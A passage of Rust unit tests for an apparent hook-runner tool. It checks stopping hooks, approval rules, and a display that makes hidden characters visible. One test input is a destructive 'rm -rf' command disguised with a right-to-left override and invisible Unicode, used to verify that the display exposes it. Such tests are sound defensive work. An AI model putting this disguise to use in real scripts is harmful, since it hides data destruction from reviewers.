        assert!(fs::read_to_string(&result)
            .unwrap()
            .contains("- Status: running"));
        let began = std::time::Instant::now(); // sleep-ok: measures that the stop beat the hook's 30 s.
        stop(&wt).await;
        assert!(!is_running(&wt));
        assert!(
            began.elapsed() < Duration::from_secs(25),
            "{:?}",
            began.elapsed()
        );
        let text = fs::read_to_string(&result).unwrap();
        assert!(
            text.contains("- Status: stopped: the workspace's worktree was removed"),
            "{text}"
        );
        assert!(!wt.join("late").exists());
        // The workspace goes to the trash while its hook runs: the hook is
        // stopped and the folder is not recreated.
        start(
            wt.clone(),
            vault.clone(),
            "ws2".into(),
            record.clone(),
            TIMEOUT,
        )
        .unwrap();
        fs::rename(
            vault.join("workspaces/ws2"),
            temp.path().join("trashed-ws2"),
        )
        .unwrap();
        assert!(request_stop(&wt));
        idle(&wt).await;
        assert!(!vault.join("workspaces/ws2").exists());
        assert!(!wt.join("late").exists());
        // Nothing running: a stop is a no-op.
        assert!(!request_stop(&wt));
        stop(&wt).await;
    }

    #[test]
    fn approve_refuses_another_repo_than_the_card_showed_or_an_unshowable_script() {
        let temp = tempfile::tempdir().unwrap();
        let record = temp.path().join("repo-trust.json");
        let wt = checkout(&temp.path().join("tool"), "echo hi\n");
        let h = hook(&wt);
        let error = approve_shown(&wt, &h.hash, Some("/elsewhere"), &record).unwrap_err();
        assert!(error.contains("not the one its card showed"), "{error}");
        approve_shown(&wt, &h.hash, Some(&h.repo), &record).unwrap();
        // Too long to show in full: never approvable.
        fs::write(wt.join(HOOK_PATH), "echo x\n".repeat(CARD_MAX_LINES + 1)).unwrap();
        let error = approve_shown(&wt, &hook(&wt).hash, None, &record).unwrap_err();
        assert!(error.contains("show in full"), "{error}");
        // Not UTF-8: never approvable.
        fs::write(wt.join(HOOK_PATH), b"echo \xff\n").unwrap();
        let error = approve_shown(&wt, &hook(&wt).hash, None, &record).unwrap_err();
        assert!(error.contains("UTF-8"), "{error}");
    }

    #[test]
    fn the_card_shows_the_whole_script_with_hidden_characters_made_visible() {
        let lines = card_script(
            "echo a\tb\x1b[2J\nrm \u{202e}-rf\n\nx\u{2028}y\u{2029}z\u{ad}w\u{180e}v\u{e0041}\n"
                .as_bytes(),
        )
        .unwrap();
        assert_eq!(lines, ["| echo a  b?[2J", "| rm ?-rf", "|", "| x?y?z?w?v?"]);
        // A long line wraps; nothing is cut.
        let long = "a".repeat(CARD_WRAP * 2 + 5);
        let lines = card_script(long.as_bytes()).unwrap();
        assert_eq!(lines.len(), 3);
        assert!(lines[1].starts_with("+ ") && lines[2] == format!("+ {}", "a".repeat(5)));
        assert_eq!(
            card_script(b"x\n".repeat(CARD_MAX_LINES).as_slice())
                .unwrap()
                .len(),
            CARD_MAX_LINES
        );
        assert!(card_script(b"x\n".repeat(CARD_MAX_LINES + 1).as_slice()).is_err());
    }
}
